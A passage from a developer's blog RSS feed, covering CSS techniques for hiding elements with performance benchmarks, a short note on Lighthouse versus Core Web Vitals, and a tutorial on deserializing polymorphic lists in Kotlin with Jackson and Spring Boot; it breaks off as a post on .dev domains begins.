etc.).&lt;/p&gt;&lt;h3&gt;The Benefit of Cached Rendering&lt;/h3&gt;&lt;p&gt;I confirmed all this with my own little setup. All it consisted of was a button and a box. I also used a some JavaScript to generate a ton of text within the box before I did any toggling, just to give the browser a little more to actually render.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;style&amp;gt;
.is-hidden {
	/* display: none; /*

	/* vs. */

	/* content-visibility: hidden; */
}    
&amp;lt;/style&amp;gt;

&amp;lt;button id=&quot;button&quot;&amp;gt;Click me&amp;lt;/button&amp;gt;

&amp;lt;div id=&quot;boxWrapper&quot;&amp;gt;
	&amp;lt;div id=&quot;box&quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;script&amp;gt;
	const box = document.getElementById(&apos;box&apos;);
    
    // Stuff it with 10k &amp;lt;div&amp;gt;s.
	for (let i = 0; i &amp;lt; 10_000; i++) {
		const div = document.createElement(&apos;div&apos;);
		div.innerText = &apos;Hi!&apos;;
		box.appendChild(div);
	}
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, I wired up that button. On click, I measured how long it took to toggle the box 100 times. If I did all of this synchronously, the browser would batch the DOM changes between repaints, bypassing the point of our experiment. To get around that, the toggling is spaced around the repaint cycle using a couple of &lt;code&gt;requestAnimationFrame()&lt;/code&gt; calls. For some more information on why this works, I wrote about it &lt;a href=&quot;https://macarthur.me/posts/when-dom-updates-appear-to-be-asynchronous?ref=cms.macarthur.me&quot;&gt;in more depth here&lt;/a&gt;.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const button = document.getElementById(&quot;button&quot;);

button.addEventListener(&quot;click&quot;, async () =&amp;gt; {
	const start = performance.now();

	for (let i = 0; i &amp;lt; 100; i++) {
		await new Promise((resolve) =&amp;gt; {
			requestAnimationFrame(() =&amp;gt; {
				requestAnimationFrame(() =&amp;gt; {
                    
					// toggle after every repaint
					boxWrapper.classList.toggle(&quot;is-hidden&quot;);
					resolve();
				});
			});
		});
 	}
    
	console.log(&quot;ms:&quot;, performance.now() - start);
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The difference was very clear, and only increased as the number of elements to render grew. First, I tested with a the 10,000 &lt;code&gt;&amp;lt;div /&amp;gt;&lt;/code&gt; mentioned above. Using &lt;code&gt;content-visibility&lt;/code&gt; reduced the total amount of time by over 30%:&lt;/p&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Approach&lt;/th&gt;
&lt;th&gt;Milliseconds&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;display: hidden;&lt;/td&gt;
&lt;td&gt;4,948&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;content-visibility: hidden;&lt;/td&gt;
&lt;td&gt;3,332&lt;/td&gt;
&lt;/tr&gt;
    &lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
        &lt;td&gt;&lt;strong&gt;&lt;em&gt;~33% faster&lt;/em&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;p&gt;Out of curiosity, I then bumped up number of &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt;s to 100,000. This time around, the performance impact was even more bonkers: &lt;/p&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Approach&lt;/th&gt;
&lt;th&gt;Milliseconds&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;display: hidden;&lt;/td&gt;
&lt;td&gt;47,216 ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;content-visibility: hidden;&lt;/td&gt;
&lt;td&gt;7,495 ms&lt;/td&gt;
&lt;/tr&gt;
    
    &lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
        &lt;td&gt;&lt;strong&gt;&lt;em&gt;~84% faster&lt;/em&gt;&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;p&gt;Chrome&apos;s performance tooling also shows a big difference between the two. I let both approaches run for 10 seconds, getting the following two summaries from the performance audit. I knew it&apos;d be an imperfect scientific test, but I was hoping it&apos;d still reveal a clear winner. &lt;/p&gt;&lt;p&gt;First, using &lt;code&gt;display: none&lt;/code&gt;: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/12/image-7.png&quot; alt=&quot;using &apos;display: none&apos; causes lots of rendering&quot; loading=&quot;lazy&quot; width=&quot;1018&quot; height=&quot;718&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/12/image-7.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/12/image-7.png 1000w, https://cms.macarthur.me/content/images/2023/12/image-7.png 1018w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;And second, using &lt;code&gt;content-visibility:&lt;/code&gt;&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/12/image-8.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1072&quot; height=&quot;696&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/12/image-8.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/12/image-8.png 1000w, https://cms.macarthur.me/content/images/2023/12/image-8.png 1072w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;As you can see, there&apos;s a stark difference in the amount of rendering work being done – 83% less – confirming all those &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt;s are being pulled from the rendering cache each time they need to be shown again. &lt;/p&gt;&lt;h3&gt;What about browser support? &lt;/h3&gt;&lt;p&gt;At the time of writing this, &lt;code&gt;content-visibility&lt;/code&gt; &lt;a href=&quot;https://caniuse.com/?search=content-visibility&amp;amp;ref=cms.macarthur.me&quot;&gt;doesn&apos;t have incredible browser support&lt;/a&gt;. It sits at about 74% global support, with Firefox and Safari being the stragglers. Still, CSS&apos;s &lt;code&gt;@supports&lt;/code&gt; at-rule makes it simple to set up a &lt;code&gt;display: none&lt;/code&gt; fallback:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;.is-hidden {
	display: none;
}

@supports (content-visibility: hidden) {
	.is-hidden {
		display: initial;
		content-visibility: hidden;
	}
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With the numbers I saw and the simple &lt;code&gt;display&lt;/code&gt; fallback, I know I&apos;ll be reaching for this more often when building out components that&apos;ll show and hide for various purposes.&lt;/p&gt;&lt;h2&gt;#5. the &apos;hidden&apos; attribute&lt;/h2&gt;&lt;p&gt;Here&apos;s the one that started this curiosity train. The &lt;code&gt;hidden&lt;/code&gt; attribute is intended to be simple way to tell browser to hide an element &lt;em&gt;without CSS&lt;/em&gt;. More than anything, it&apos;s about semantics. &lt;/p&gt;&lt;p&gt;Philosophically, CSS is primarily concerned with the &lt;em&gt;presentation&lt;/em&gt; of elements on a page, and not so much with their semantics. In fact, the original documentation for the language are &lt;a href=&quot;https://www.w3.org/TR/REC-CSS1/?ref=cms.macarthur.me#basic-concepts&quot;&gt;riddled with this sort of language&lt;/a&gt;, and the more modern &quot;snapshot&quot; documents &lt;a href=&quot;https://www.w3.org/TR/CSS/?ref=cms.macarthur.me&quot;&gt;maintain the same sentiment&lt;/a&gt;. Read through it, and you&apos;ll see a lot of verbiage like this (I&apos;ve added emphasis): &lt;/p&gt;&lt;blockquote&gt;CSS is used to describe the &lt;strong&gt;presentation&lt;/strong&gt; of a source document, and usually &lt;strong&gt;does not change the underlying semantics&lt;/strong&gt; expressed by its document language.&lt;/blockquote&gt;&lt;p&gt;So, consider something that might need to be rendered on a page eventually, but doesn&apos;t always belong there semantically – like an error message. Using &lt;code&gt;hidden&lt;/code&gt; in cases like this offers some benefits. &lt;/p&gt;&lt;p&gt;Most obviously, it&apos;s simpler to implement. No inline styles or one-off &quot;is-hidden&quot; CSS classes you need to include in your stylesheets. The attribute doesn&apos;t even need to have a value. It just needs to exist: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- Won&apos;t be rendered! --&amp;gt;
&amp;lt;div id=&quot;error&quot; hidden&amp;gt;This is an error message!&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And when it does need to be shown, the amount of JavaScript you need to write is more elegant too (at least to me):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const errorEl = document.getElementById(&apos;error&apos;);

errorEl.removeAttribute(&apos;hidden&apos;);

// This works too!
// errorEl.hidden = false;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In all, it&apos;s a nice separation of concerns. Leave your CSS to the stylistic, presentational stuff, and the &lt;code&gt;hidden&lt;/code&gt; attribute to whether it&apos;s appropriate to show something on the page (yet). &lt;/p&gt;&lt;h3&gt;A &quot;hidden&quot; Superpower&lt;/h3&gt;&lt;p&gt;Under the hood, the &lt;code&gt;hidden&lt;/code&gt; attribute is very similar to using &lt;code&gt;display: none&lt;/code&gt;. It removes the element from the accessibility tree, preventing screen readers from accessing it, as well as the browser&apos;s &quot;find&quot; functionality. &lt;/p&gt;&lt;p&gt;But by using a special attribute value – &quot;until-found&quot; – you can &quot;break out&quot; of that hidden state as soon as the item&apos;s been found using the browser&apos;s search functionality (or &quot;command + F&quot;). Here&apos;s a really simple demonstration of the feature with the following markup:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;h2&amp;gt;secret content below:&amp;lt;/h2&amp;gt;

&amp;lt;div hidden=&quot;until-found&quot;&amp;gt;
	&amp;lt;div&amp;gt;You found it!&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s hidden at first, but as soon as I search for &quot;found,&quot; it shows up:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/12/hidden-until.gif&quot; alt=&quot;text is hidden until it&apos;s found&quot; loading=&quot;lazy&quot; width=&quot;716&quot; height=&quot;350&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/12/hidden-until.gif 600w, https://cms.macarthur.me/content/images/2023/12/hidden-until.gif 716w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;This makes is a great tool for components like an FAQ accordion. On page load, the content can be visually hidden. But if a user&apos;s searching for a specific string, it can be made immediately visible. &lt;/p&gt;&lt;p&gt;The only downside to this mechanism is its browser support. Currently, only &lt;a href=&quot;https://caniuse.com/?search=until-found&amp;amp;ref=cms.macarthur.me&quot;&gt;Chromium-based browsers&lt;/a&gt; appear to respect it.&lt;/p&gt;&lt;h2&gt;Some Honorable Hacks&lt;/h2&gt;&lt;p&gt;There&apos;s a handful of other tactics out there used to hide items, but in my opinion, they&apos;re better relegated to &quot;hacks&quot; in most cases. &lt;/p&gt;&lt;p&gt;For example, you can hide something by zeroing out its height &amp;amp; width, sending it far off screen with creative &lt;code&gt;absolute&lt;/code&gt; positioning, or setting a &lt;code&gt;z-index&lt;/code&gt; value to negative eternity. &lt;/p&gt;&lt;p&gt;I&apos;m sure I&apos;ve missed a few others, but regardless, despite their value in certain scenarios, they&apos;re typically not designed &lt;em&gt;for the explicit purpose&lt;/em&gt; of hiding things. And for that reason, I chose to bypass them here. &lt;/p&gt;&lt;h2&gt;How should you hide your elements?&lt;/h2&gt;&lt;p&gt;There are a million different circumstances out there, each with their own quirks and exceptions, but here&apos;s a quick run-down of how I&apos;d reach for the different approaches explored here: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;display: none&lt;/code&gt; when you want to completely remove an element from the page layout and accessibility tree. Especially when it&apos;s intended to be a permanent removal, since its rendering isn&apos;t cached.&lt;/li&gt;&lt;li&gt;Use &lt;code&gt;opacity: 0&lt;/code&gt; when you want to preserve page layout and accessibility, and just want to make the element invisible. &lt;/li&gt;&lt;li&gt;Use &lt;code&gt;visibility: hidden&lt;/code&gt; when you&apos;d like to preserve page layout, but you &lt;em&gt;don&apos;t&lt;/em&gt; want it to be accessible (and therefore focusable + findable). &lt;/li&gt;&lt;li&gt;Use &lt;code&gt;content-visibility: hidden&lt;/code&gt; when you&apos;d like to completely remove something from the page and accessibility tree, but keep it cached behind the scenes because you might need it back later.&lt;/li&gt;&lt;li&gt;Use the &lt;code&gt;hidden&lt;/code&gt; attribute when you want to remove an element from the page + accessibility tree in a semantic way that doesn&apos;t require you to touch any CSS.&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;Learn to Appreciate the Trade-Offs&lt;/h2&gt;&lt;p&gt;Honestly, I&apos;m a little exhausted just looking back at these tactics. For the longest time, I&apos;ve made it just fine with setting &lt;code&gt;display&lt;/code&gt; and &lt;code&gt;opacity&lt;/code&gt; properties to make elements go away when intended, and overall, everything&apos;s been just fine. With that in mind, it might be easy to shrug some of these off and continue on your merry way. And no one would die. &lt;/p&gt;&lt;p&gt;But at the same time, these tools that sometimes &lt;em&gt;feel&lt;/em&gt; like virtually the same thing can make a big difference in ways that are often overlooked. I&apos;m sure I&apos;ve shipped a lot of code that does what&apos;s needed on the surface, only to neglect things like performance or accessibility. &lt;/p&gt;&lt;p&gt;So, don&apos;t just dismiss these as X different ways to do the same thing. There are serious trade-offs between each of them, and you might be surprised by how they can elevate the performance or accessibility of your applications.&lt;/p&gt;</content:encoded></item><item><title>Lighthouse is Not Your User</title><link>https://macarthur.me/posts/lighthouse</link><guid isPermaLink="true">https://macarthur.me/posts/lighthouse</guid><pubDate>Fri, 01 Dec 2023 06:00:00 GMT</pubDate><content:encoded>&lt;p&gt;You might’ve used Google’s Lighthouse (also built into its PageSpeed Insights tool) for auditing page performance. It’s great! Even fun — the “get a perfect Lighthouse score” game is a personal favorite.&lt;br /&gt;&lt;br /&gt;Still, it’s good to remember how it relates to the Core Web Vitals.&lt;br /&gt;&lt;br /&gt;Lighthouse is a _diagnostic_ tool that help you identify opportunities to potentially improve user experience.&lt;br /&gt;&lt;br /&gt;The Core Web Vitals, on the other hand, are metrics derived from &lt;em&gt;actual user data&lt;/em&gt;, and are intended to be a better picture of how real users are experiencing your site.&lt;br /&gt;&lt;br /&gt;Don’t get caught up in appeasing the former. Just use it as a “lighthouse” 😎 to help know if you’re headed in the right direction, and to identify any big problem areas you need to address.&lt;br /&gt;&lt;br /&gt;If you get the purposes of these tools mixed up, you risk Goodhart’s law taking hold. Your Lighthouse scores become the end game, and you begin to neglect the thing those metrics exist to ultimately serve — your users.&lt;/p&gt;</content:encoded></item><item><title>Deserializing Polymorphic Lists with Kotlin, Jackson, and Spring Boot</title><link>https://macarthur.me/posts/handling-polymorphic-lists</link><guid isPermaLink="true">https://macarthur.me/posts/handling-polymorphic-lists</guid><pubDate>Sat, 25 Nov 2023 05:05:20 GMT</pubDate><content:encoded>&lt;p&gt;One of my favorite features of TypeScript is &lt;em&gt;discriminated unions, &lt;/em&gt;in which a common literal type is used to determine the narrowest possible type of an object. Think of two types of messages – &lt;code&gt;Email&lt;/code&gt; and &lt;code&gt;SMS&lt;/code&gt;, with types defined as such:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;interface Email {
	kind: &apos;email&apos;; // &amp;lt;- literal type
	subject: string;
	from: string;
	to: string;
	body: string;
}

interface SMS {
	kind: &apos;sms&apos;; // &amp;lt;- literal type
	sender: string;
	recipient: string;
	content: string;
}

// A union type, discriminated by &quot;kind&quot;:
type Message = Email | SMS;

// TypeScript error:
// Property &apos;content&apos; is missing in type 
// &apos;{ kind: &quot;sms&quot;; sender: string; recipient: string; }&apos; 
// but required in type &apos;SMS&apos;.
const myMessage: Message = {
	kind: &apos;sms&apos;,
	sender: &apos;+11234567890&apos;,
	recipient: &apos;+10987654321&apos;,
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since &lt;code&gt;myMessage&lt;/code&gt; has a literal of &lt;code&gt;kind: &apos;sms&apos;&lt;/code&gt;, TypeScript knows it&apos;s an &lt;code&gt;SMS&lt;/code&gt;, prompting it for the missing &lt;code&gt;content&lt;/code&gt; property. No further configuration necessary.&lt;/p&gt;&lt;h2&gt;Submitting a Polymorphic List to a REST Endpoint&lt;/h2&gt;&lt;p&gt;This is a useful feature for a number of cases. One of them is submitting a list of data composed of multiple types (a &lt;em&gt;polymorphic&lt;/em&gt; list) to a REST endpoint. Here&apos;s an example with Fastify, using the same &lt;code&gt;Message&lt;/code&gt; type defined above. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/11/image-13.png&quot; alt=&quot;example fastify route showing typescript error&quot; loading=&quot;lazy&quot; width=&quot;1456&quot; height=&quot;858&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/11/image-13.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/11/image-13.png 1000w, https://cms.macarthur.me/content/images/2023/11/image-13.png 1456w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;As you can see, when we attempt to pull &lt;code&gt;content&lt;/code&gt; off of what TypeScript knows is an &lt;code&gt;Email&lt;/code&gt;, it gets mad. For good reason!&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/11/image-14.png&quot; alt=&quot;typescript error message&quot; loading=&quot;lazy&quot; width=&quot;1570&quot; height=&quot;310&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/11/image-14.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/11/image-14.png 1000w, https://cms.macarthur.me/content/images/2023/11/image-14.png 1570w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Thanks to that discriminated union, it &lt;em&gt;knows&lt;/em&gt; that if it&apos;s an &quot;email&quot; it can&apos;t have a &lt;code&gt;content&lt;/code&gt; property, preventing us from writing bugs we&apos;d otherwise only find at runtime.&lt;/p&gt;&lt;h3&gt;Validating the Payload at Runtime&lt;/h3&gt;&lt;p&gt;As a secondary benefit, because we&apos;re using Fastify, it&apos;s easy to validate that incoming request too, albeit much more verbosely than simply defining some types. Here&apos;s how that&apos;d look:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const emailSchema = {
	type: &quot;object&quot;,
	required: [&quot;kind&quot;, &quot;subject&quot;, &quot;from&quot;, &quot;to&quot;, &quot;body&quot;],
	properties: {
		kind: { type: &quot;string&quot;, enum: [&quot;email&quot;] },
		subject: { type: &quot;string&quot; },
		from: { type: &quot;string&quot; },
		to: { type: &quot;string&quot; },
		body: { type: &quot;string&quot; },
	},
};

const smsSchema = {
	type: &quot;object&quot;,
	required: [&quot;kind&quot;, &quot;sender&quot;, &quot;recipient&quot;, &quot;content&quot;],
	properties: {
		kind: { type: &quot;string&quot;, enum: [&quot;sms&quot;] },
		sender: { type: &quot;string&quot; },
		recipient: { type: &quot;string&quot; },
		content: { type: &quot;string&quot; },
 	},
};

server.addSchema({
	$id: &quot;message&quot;,
	oneOf: [emailSchema, smsSchema],
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can then tell Fastify to require each item in the provided array to be a &lt;code&gt;Message&lt;/code&gt;.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;server.post&amp;lt;{
  Body: Array&amp;lt;Message&amp;gt;;
}&amp;gt;(
	&quot;/submit&quot;,
	{
		schema: {
			body: {
				type: &quot;array&quot;,
				items: { $ref: &quot;message#&quot; },
			},
		},
	},
 	(request, reply) =&amp;gt; {
		// handle it
	}
);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we&apos;d get a clear error message if we left any required property off:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/11/image-15.png&quot; alt=&quot;fastify validation error message&quot; loading=&quot;lazy&quot; width=&quot;1858&quot; height=&quot;430&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/11/image-15.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/11/image-15.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/11/image-15.png 1600w, https://cms.macarthur.me/content/images/2023/11/image-15.png 1858w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;In all, we&apos;ve got some really nice guardrails to safely reason about everything once we&apos;ve made it past the request boundary.&lt;/p&gt;&lt;h2&gt;Things Look Different in Spring Boot, Jackson, and Kotlin&lt;/h2&gt;&lt;p&gt;I&apos;m not that well-versed in the JVM world. I started working in it only a couple of years ago, and it hasn&apos;t even been consistent. Still, I was hopeful this sort of convenience would exist when I wanted to submit a similar sort of list in a Spring Boot application, built with Kotlin and using the &lt;a href=&quot;https://github.com/FasterXML/jackson?ref=cms.macarthur.me&quot;&gt;Jackson serialization library&lt;/a&gt;. Think of a simple endpoint accepting a list of &lt;code&gt;Message&lt;/code&gt; objects: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;@PostMapping(&quot;/submit&quot;)
fun submitMessages(
	@RequestBody
	messages: List&amp;lt;Message&amp;gt;,
): String {
	// do stuff
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As it turns out, it doesn&apos;t have the same ergonomics as TypeScript&apos;s discriminated unions, but it&apos;s still possible to get it done. To pull it off, we&apos;re gonna use a sealed class, a neat Kotlin feature useful for creating a restricted class hierarchy. In an ideal world, this is how that class would look: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;sealed class Message {
	data class Email(
		val subject: String,
		val from: String,
		val to: String,
		val body: String,
	) : Message()

	data class SMS(
		val sender: String,
		val recipient: String,
		val content: String,
	) : Message()
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s pretty tidy, and after deserialization, it&apos;d let us use Kotlin&apos;s &lt;code&gt;when&lt;/code&gt; operator to handle each subtype as needed, despite both of them being a &lt;code&gt;Message&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;messages.map {
	when (it) {
		is Message.Email -&amp;gt; print(&quot;email!&quot;)
		is Message.SMS -&amp;gt; print(&quot;sms!&quot;)
	}
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Unfortunately, in order for Jackson to deserialize the request payload correctly, that sealed class will need to get a little more complex.&lt;/p&gt;&lt;h3&gt;Annotating the Model&lt;/h3&gt;&lt;p&gt;First up, we&apos;ll add two annotations to our &lt;code&gt;Message&lt;/code&gt; class that Jackson will use to determine how to handle the types within our submitted list.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;@JsonTypeInfo(
    use = JsonTypeInfo.Id.NAME,
    include = JsonTypeInfo.As.PROPERTY,
    property = &quot;kind&quot;,
)
@JsonSubTypes(
	JsonSubTypes.Type(value = Message.Email::class, name = &quot;email&quot;),
	JsonSubTypes.Type(value = Message.SMS::class, name = &quot;sms&quot;),
)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A brief breakdown: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;The &lt;code&gt;@JsonTypeInfo&lt;/code&gt; annotation tells Jackson that a &quot;kind&quot; property will exist on each item in the payload. &lt;/li&gt;&lt;li&gt;The &lt;code&gt;@JsonSubTypes&lt;/code&gt; annotation tells Jackson which object within our sealed class to instantiate, based on whatever was passed as the value of &quot;kind.&quot; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;To put it another way: when an item has a &quot;kind&quot; of &quot;email,&quot; Jackson will instantiate a new &lt;code&gt;Message.Email&lt;/code&gt;. When it&apos;s &quot;sms,&quot; it&apos;ll create a &lt;code&gt;Message.SMS&lt;/code&gt;. &lt;/p&gt;&lt;h3&gt;Modifying Our Sealed Class Subclasses&lt;/h3&gt;&lt;p&gt;Since we&apos;re now relying on the &quot;kind&quot; property to tell Jackson what to instantiate, we need to refactor the members our sealed class a bit too. Here&apos;s how it&apos;ll look:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;data class EmailData(
	val subject: String,
	val from: String,
	val to: String,
	val body: String,
)

data class SMSData(
	val sender: String,
	val recipient: String,
	val content: String,
)

// Aformentioned annotations go here.
sealed class Message {
    data class Email(
        @JsonProperty(&quot;message&quot;)
        val message: EmailData,
    ) : Message()

    data class SMS(
        @JsonProperty(&quot;message&quot;)
        val message: SMSData,
    ) : Message()
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, neither shape has its information declared as top-level properties anymore. Since we needed to make room for a &lt;code&gt;kind&lt;/code&gt; of message, it&apos;s been relegated to a &lt;code&gt;message&lt;/code&gt; property, with the details being extracted to &lt;code&gt;EmailData&lt;/code&gt; and &lt;code&gt;SMSData&lt;/code&gt; classes. &lt;/p&gt;&lt;p&gt;Not as clean as I&apos;d like it to be, but it&apos;ll do the job. &lt;/p&gt;&lt;h3&gt;Validating Everything&lt;/h3&gt;&lt;p&gt;We can test this out by modifying our endpoint to spit back the messages we provide. Obviously, in a production application, you&apos;d be doing something more interesting.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;@PostMapping(&quot;/submit&quot;)
fun submitMessages(
	@RequestBody
	messages: List&amp;lt;Message&amp;gt;,
): String = messages.map {
	when (it) {
		is Message.Email -&amp;gt; &quot;email&quot;
		is Message.SMS -&amp;gt; &quot;sms&quot;
	}
}.joinToString { it }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We&apos;ll hit it with the following payload: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;[
    {
		&quot;kind&quot;: &quot;sms&quot;,
		&quot;message&quot;: {
			&quot;sender&quot;: &quot;+11234567890&quot;, 
			&quot;recipient&quot;: &quot;+10987654321&quot;,
			&quot;content&quot;: &quot;hey&quot;
		}
	},
	{
		&quot;kind&quot;: &quot;email&quot;,
		&quot;message&quot;: {
			&quot;subject&quot;: &quot;a subject&quot;, 
			&quot;from&quot;: &quot;me@example.com&quot;, 
			&quot;to&quot;: &quot;you@example.com&quot;, 
			&quot;body&quot;: &quot;hello&quot;
		}
	}
]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Spring is able to deserialize the payload into the objects we expect, and we get back what we intended: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/11/image-11.png&quot; alt=&quot;the expected response from a POST request&quot; loading=&quot;lazy&quot; width=&quot;1694&quot; height=&quot;332&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/11/image-11.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/11/image-11.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/11/image-11.png 1600w, https://cms.macarthur.me/content/images/2023/11/image-11.png 1694w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;And just by relying on plain, ol&apos; Kotlin types, we get some useful feedback when submitting invalid data too. Here&apos;s what we get just by leaving off &lt;code&gt;&quot;content&quot;: &quot;hey&quot;&lt;/code&gt; in the above payload:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2023/11/image-12.png&quot; alt=&quot;a 400 response caused by a missing property&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;563&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2023/11/image-12.png 600w, https://cms.macarthur.me/content/images/size/w1000/2023/11/image-12.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2023/11/image-12.png 1600w, https://cms.macarthur.me/content/images/2023/11/image-12.png 2210w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Based on what we set as the message &quot;kind,&quot; Spring knows exactly what to enforce on the incoming request, even without using a more mature validation library like Javax or Jakarta (which are recommended in more fleshed out applications, by the way). &lt;/p&gt;&lt;p&gt;So, any client will get the feedback they need when attempting to submit data, and our application will have full type knowledge when handling that request to completion.&lt;/p&gt;&lt;h2&gt;Shout-Out to a Potentially Better Design&lt;/h2&gt;&lt;p&gt;I&apos;ve heard feedback that designing a request payload like this might be more of an interesting, &quot;smelly&quot; design than a &lt;em&gt;good&lt;/em&gt; one. A better approach might be to accept a &lt;code&gt;MessagePayload&lt;/code&gt; model, which would hold both &lt;code&gt;SMS&lt;/code&gt; and &lt;code&gt;Email&lt;/code&gt; messages. Something like this (beware... untested code): &lt;/p&gt;&lt;pre&gt;&lt;code&gt;sealed class Message {
    data class Email(
		val subject: String,
		val from: String,
		val to: String,
		val body: String,
    ) : Message()

    data class SMS(
		val sender: String,
		val recipient: String,
		val content: String
    ) : Message()
}

data class MessagePayload(
    val smsMessages: List&amp;lt;Message.SMS&amp;gt;,
    val emailMessages: List&amp;lt;Message.Email&amp;gt;
)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Admittedly, it does read easier, and would require less dependence on Jackson&apos;s annotations to inform Kotlin how to build out the items within the payload. I think there&apos;s a lot of value in that. In general, incline yourself toward simpler, more readable code. &lt;/p&gt;&lt;p&gt;But... there also doesn&apos;t seem to be a demonstrable benefit to this over a polymorphic approach. In the end, the way we&apos;re handling a polymorphic list gives us full type safety + request validation, and it might also expose a more useful interface to whatever clients will be using the endpoint. &lt;/p&gt;&lt;p&gt;Like any other engineering problem, it can probably be reduced to &quot;it depends.&quot; Even so, I&apos;m curious to hear your thoughts on how to simplify this, and whether there are legitimate reasons to avoid such a design in favor of another. &lt;/p&gt;</content:encoded></item><item><title>For Maximum Accessibility, Be Careful About Using a .dev Domain</title><link>https://macarthur.me/posts/dot-dev-problems</link><guid isPermaLink="true">https://macarthur.me/posts/dot-dev-problems</guid><pubDate>Mon, 30 Oct 2023 05:28:17 GMT</pubDate><content:encoded>&lt;p&gt;It&apos;s been an interesting couple of weeks debugging a DNS/connectivity issue for &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt;&apos;s [now former] domain, so I&apos;m taking the time to write a few thoughts down before it all goes 